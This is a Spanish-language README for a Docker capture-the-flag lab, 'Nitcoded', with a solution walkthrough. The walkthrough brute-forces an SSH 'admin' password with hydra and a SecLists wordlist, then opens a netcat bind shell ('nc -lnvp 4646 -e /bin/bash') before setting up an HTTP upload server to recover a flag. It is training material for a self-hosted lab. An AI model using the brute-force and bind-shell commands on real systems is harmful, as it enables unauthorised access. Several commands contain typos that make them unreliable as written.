# Nitcoded

- [1. Descripción](#1.-descripción)
- [2. Instalación y despliegue](#2.-instalación-y-despliegue)
- [2.1. Despliegue manual](#2.1.-despliegue-manual)
- [2.2. Despliegue atomático](#2.2.-despliegue-atomático)
- [3. Descripción del laboratorio](#3.-descripción-del-laboratorio)
- [4. Resolución del laboratorio](#4.-resolución-del-laboratorio)
- [4.1. Cracking de credenciales](#4.1.-cracking-de-credenciales)
- [4.2. Sesión interactiva](#4.2.-sesión-interactiva)
- [4.3. Configuración del servidor HTTP](#4.3.-configuración-del-servidor-http)
- [4.4. Recepción de archivos](#4.4.-recepción-de-archivos)
- [4.5. Obtención de la flag](#4.5.-obtención-de-la-flag)

## 1. Descripción

Esta laboratorio es una simulación de un entorno cliente-servidor, en el cual se profundizará en la configuración de servidores HTTP y automatización de tareas. Utiliza Docker para simular dos servidores, cada uno con configuraciones específicas destinadas a desafiar al usuario a utilizar una variedad de herramientas y técnicas de administración.

## 2. Instalación y despliegue

Antes de iniciar el laboratorio, asegúrate de tener Docker instalado en tu sistema. Si no tienes Docker, puedes instalar siguiendo las instrucciones en el sitio oficial de Docker para [Windows](https://docs.docker.com/docker-for-windows/install/), [Mac](https://docs.docker.com/docker-for-mac/install/) o [Linux](https://docs.docker.com/engine/install/).
Para el despliegue, tanto manual como automático, será neceasrio crear una red en Docker de tipo _bridge_:

```bash
docker network create nitcoded
```

## 2.1. Despliegue manual

Para desplegar manualmente el laboratorio, deberás clonar este repositorio y ejecutar los siguientes comandos Docker para su lanzamiento:

```bash
git clone https://github.com/kradbyte/elementals-labs.git
docker build -f kradbyte/nitcoded:server -f Dockerfile.server elementals-labs/7-Nitcoded 
docker build -f kradbyte/nitcoded:client -f Dockerfile.client elementals-labs/7-Nitcoded
docker run -d --name nitcoded-server --network nitcoded -p [ServerPort]:22 -p [ServerPort]:4646
docker run -d --name nitcoded-client --network nitcoded kradbyte/nitcoded:client
```

No olvides cambiar los `ServerPort` por los puertos que se expondrán para los servicios SSH y el puerto libre para otro servicio detallado más adelante.

## 2.2. Despliegue atomático

Para desplegar el laboratorio atomáticamente bastará con ejecutar los siguientes comandos:

```bash
docker run -d --name nitcoded-server --network nitcoded -p [ServerPort]:22 -p [ServerPort]:4646
docker run -d --name nitcoded-client --network nitcoded kradbyte/nitcoded:client
```

No olvides cambiar los `ServerPort` por los puertos que se expondrán para los servicios SSH y el puerto libre para otro servicio detallado más adelante.

> **Nota**: No se recomienda cambiar el nombre de los contenedores, ya que hay configuraciones internas que funcionan con la resolución de los DNS de los contenedores, por lo que solo es posible cambiar el nombre de los contenedores si cambiamos las configuraciones también.

## 3. Descripción del laboratorio

**Description**
Pato va a enviar cerca de 100 archivos al servidor por HTTP, así que debes ingresar al servidor con el rol administrador y preparar todo para que Pato pueda enviar sus archivos.

**Target**
Configura un servidor HTTP.

**Steps**
- Ingresa al servidor
- Configura el servidor HTTP.
- Espera y gestiona los archivos recibidos.
- Descifra la flag en los archivos recibidos.

**Grants**
- La flag se encuentra segmentada en todos los archivos que envía Pato, deberás buscar la diferencia entre todos para encontrar la flag.
- Para el servidor HTTP no es necesario colocarle contraseña, dado que Pato hace un curl sin contraseña, que si bien no es seguro es más práctico por ser una red interna.
- El puerto 4646 está expuesto para cualquier uso.

## 4. Resolución del laboratorio

### 4.1. Cracking de credenciales

Primero deberemos crackear las credenciales de la SSH para acceder al servidor. La descripción nos proporciona información acerca de que nuestro rol es de administrador, por lo que podremos ingresar como _admin_, por lo que ahora deberemos buscar la contraseña con herramientas como _hydra_. Como diccionario podremos utilizar algún diccionario de [SecList](https://github.com/danielmiessler/SecLists/blob/master/Passwords/500-worst-passwords.txt).

```bash
hydra -L admmin -p /ruta/a/tu/diccionario.txt ssh://ServerIP:ServerPort
```

No olvides cambiar `ServerIP` y `ServerPort` por la IP del servidor y el puerto por el que corre la SSH (en caso de haber configurado SSH en un puerto distinto al 22).

### 4.2. Sesión interactiva

Cuando hayamos descubierto la contraseña e intentemos hacer la conexión al servidor por SSH, la sesión se cerrará y nos impedirá obtener la consola interactiva, sin embargo, podremos ejecutar comandos por SSH. Para poder obtener la consola interactiva podremos configurar una _bind shell_ instalando Netcat primero:

```bash
ssh admin@ServerIP sudo apt-get install -y netcat-traditional
```

No olvides reemplazar `ServerIP` por la IP del servidor.
Una vez hayamos instalado NetCat podremos ponernos en escucha por el puerto 4646 que estaba libre en el despliegue del contenedor:

```bash
ssh admin@ServerIP nc -lnvp 4646 -e /bin/bash
```

En nuestra máquina deberemos abrir otra terminal y conectarnos por Netcat:

```bash
nc ServerIP 4646
```

Otra forma en que podremos ganar la consola interactiva será ejecutando lo siguiente:

```bash
ssh admin@SererIP exec bash -i
```

### 4.3. Configuración del servidor HTTP

Para configurar el servidor HTTP podrías, incluso, levantarlo con Python:

```bash
python3 -m http.server
```

Sin embargo, nuestro servidor debe tener capacidades POST/PUT, dado que el cliente enviará archivos al servidor, por lo que podremos buscar alguna alternativa como un script en Python que acepte POST/PUT. Recuerda que HTTP se monta en el puerto 80.

### 4.4. Recepción de archivos

Cuando hayamos configurado el servidor correctamente, el cliente comenzará a enviar los archivos en lotes de 10 cada 3 minutos, por lo que podremos buscar una forma de gestionar estas recepciones, dado que para recibir todos los archivos tardará cerca de 30 minutos.
Se sugiere implementar un script en bash que guarde los arhivos en alguna ubicación y vaya renombrando los archivos recibidos, junto con una tarea cron para que el proceso se realice automáticamente.

### 4.5. Obtención de la flag

Una vez hayamos obtenido todos los archivos (90 en total) deberemos realizar la lectura de cada uno, ya que al descrifrarlos encontraremos un caracter diferente en cada archivo que deberás compilar para obtener una frase encriptada en base64 que contendrá la flag. Esto también se puede automatizar con un script.
